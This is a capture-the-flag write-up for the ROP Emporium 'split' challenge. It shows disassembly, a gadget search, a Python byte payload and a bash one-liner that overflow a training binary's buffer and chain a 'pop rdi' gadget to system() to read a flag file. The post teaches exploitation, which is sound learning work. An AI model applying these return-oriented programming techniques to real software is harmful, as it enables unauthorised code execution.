---
title: 02_split
categories: [series, rop_emporium]
---

# ROP Emporium split

* **Tools:** IDA Free 7.0, gdb-gef, checksec, ropper
* **Prerequistes:** Stack frame
* **Download solution:** [main.py](/assets/series/rop_emporium/main.py)

## Overview

> "You can do the [...] 64bit challenge with a 3 link chain."

So here we are, our first ROP. We'll have to find a gadget allowing to call `_system()` with the correct parameter. The binary has the same protection as the [previous one](/posts/ropemporium-ret2win).

## Function pwnme()

Overall, the function `pwnme()` is similar to the first challenge, except that `_fgets()` takes a longer input (96 bytes):
```
00000000004007EC    mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
00000000004007F3    lea     rax, [rbp+s]
00000000004007F7    mov     esi, 96         ; n
00000000004007FC    mov     rdi, rax        ; s
00000000004007FF    call    _fgets
```
However, the basics idea remains the same: taking over _rip_ and no stack protector.

## Function usefulFunction()

At `0x400807` is a cool function calling `_system()`:
```
0000000000400807 usefulFunction  proc near
0000000000400807    push    rbp
0000000000400808    mov     rbp, rsp
000000000040080B    mov     edi, offset command ; "/bin/ls"
0000000000400810    call    _system
0000000000400815    nop
0000000000400816    pop     rbp
0000000000400817    retn
0000000000400817 usefulFunction  endp
```
It calls `_system()` with its first parameter pointing to the string `"/bin/ls"` (the Linux x64 calling convention puts parameters of functions in up to 6 registers: `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`; the Windows x64 calling convention uses `RCX`, `RDX`, `R8`, `R9`; and if a function requires more than 6 or 4 parameters they are put on the stack). However, we don't want to execute `"/bin/ls"`, but `"/bin/cat flag.txt"`. Let's do a search string in IDA with **alt+t** and enter "cat"; we find what we want at address `0x601060`:
```
0000000000601060                 public usefulString
0000000000601060 usefulString    db '/bin/cat flag.txt',0
``` 
Now it would be nice if we could put this address in `rdi`. Let's see what **ropper** can bring:
```bash
ropper -f split --search "pop ?di"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop ?di

[INFO] File: split
0x0000000000400883: pop rdi; ret; 
```
Yay! `0x400883` is the way to go.

## Chaining things

So, putting things together we'll have to:
* Hijack `rip` to reach `0x400883`, address of the gadget `pop rdi`;
* POP `"0x601060"` (the address of `"/bin/cat flag.txt"`) into `rdi`;
* Hijack `rip` to reach `0x400810`, address of the call to `_system()`.

Raw payload in Python:
```python
payload = b''
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # RBP
payload += b'\x83\x08\x40\x00\x00\x00\x00\x00' # RIP: go to 'pop rdi'
payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # value to pop in rdi
payload += b'\x10\x08\x40\x00\x00\x00\x00\x00' # RIP: got to _system
```
Bash command line:
```bash
python -c 'print("\x41"*0x20+"\x42"*8+"\x83\x08\x40\x00\x00\x00\x00\x00\x60\x10\x60\x00\x00\x00\x00\x00\x10\x08\x40\x00\x00\x00\x00\x00")' | ./split
```

Stack frame after `_fgets()`:
```vim
0x00007fffffffe1d0: 0x4141414141414141  <-+ buffer start
0x00007fffffffe1d8: 0x4141414141414141    |
0x00007fffffffe1e0: 0x4141414141414141    |
0x00007fffffffe1e8: 0x4141414141414141  <-+ buffer end
0x00007fffffffe1f0: 0x4242424242424242  <-- RBP
0x00007fffffffe1f8: 0x0000000000400883  <-- gadget "pop rdi"
0x00007fffffffe200: 0x0000000000601060  <-- ->"/bin/cat flag.txt"
0x00007fffffffe208: 0x0000000000400810  <-- call _system()
```

---
EOF
